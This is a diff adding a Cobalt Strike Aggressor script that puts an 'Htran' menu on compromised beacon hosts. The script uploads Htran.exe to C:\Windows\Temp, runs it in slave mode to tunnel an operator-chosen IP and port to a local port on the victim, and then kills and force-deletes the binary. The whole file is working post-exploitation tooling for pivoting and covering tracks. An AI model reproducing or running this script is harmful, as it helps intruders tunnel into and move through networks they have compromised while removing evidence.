@@ -1,0 +1,38 @@
+menu "Htran" {
+	item "上传Htran" {
+		$bid = $1;
+		$dialog = dialog("上传Htran", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &Htran);
+		drow_text($dialog, "UploadPath",  "上传路径: "); 	
+		dbutton_action($dialog, "上传");
+		dialog_show($dialog);
+	}
+	sub Htran {
+	    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/Htran/Htran.exe"));
+	}
+    
+	item "运行Htran"{
+		$bid = $1['@'];
+	    $Dialog = dialog("运行Htran", %(ip => "", port => "",bid => $bid),&Htran_run);
+	    drow_text($Dialog, "ip", "ip: ");
+	    drow_text($Dialog, "port", "port: ");
+	    drow_text($Dialog, "port1", "目标port: ");
+	    dbutton_action($Dialog, "运行");
+	    dialog_show($Dialog);
+	}
+	sub Htran_run{
+	    local('$Name $port');
+	    $Name = $3['ip'];
+	    $port = replace($3['port'], "\"", "");
+	    $port1 = replace($3['port1'], "\"", "");
+		bshell($bid, "Htran.exe -slave  $+ $Name  $+ $port 127.0.0.1  $+ $port1");
+	}
+
+	item "删除Htran"{
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "TASKKILL /F /IM Htran.exe");
+			bshell($1, "del /f /s /q Htran.exe");
+		}
+	}
+}
